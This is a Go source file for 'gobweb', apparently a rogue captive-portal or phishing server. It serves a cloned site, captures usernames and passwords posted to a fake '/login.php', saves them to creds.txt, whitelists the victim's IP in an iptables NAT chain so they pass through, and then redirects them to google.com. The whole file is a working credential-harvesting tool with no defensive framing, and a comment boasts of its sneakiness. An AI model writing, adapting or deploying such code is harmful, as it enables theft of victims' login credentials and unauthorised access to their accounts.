package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
)

func login(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	ip := strings.Split(r.RemoteAddr, ":")[0]

	username := r.Form.Get("username")
	password := r.Form.Get("password")

	if username == "" || username == "username" ||
		password == "" || password == "password" {
		return
	}

	/* iptables whitelist */
	cmd := exec.Command("iptables", "-t", "nat", "-I", "GOBWEB", "-s", ip, "-j", "RETURN")
	_, err := cmd.Output()

	if err != nil {
		fmt.Printf("[+] iptables whitelist error!\n")
		panic(err)
	}

	fo, err := os.OpenFile("creds.txt", os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0666)
	defer fo.Close()

	if err != nil {
		fmt.Printf("[+] file open error!\n")
		panic(err)
	}

	fo.WriteString(username + ":" + password + "\n")

	fmt.Printf("[+] username: %v password %v\n", username, password)

	fmt.Fprint(w, "<script> setTimeout(function() { window.location.replace(\"http://google.com\"); }, 3000) </script>")
}

func main() {
	log.Println("gobweb started")
	http.Handle("/", http.FileServer(http.Dir("site/")))

	/* Aren't I sneaky */
	http.HandleFunc("/login.php", login)
	log.Fatal(http.ListenAndServe(":80", nil))
}
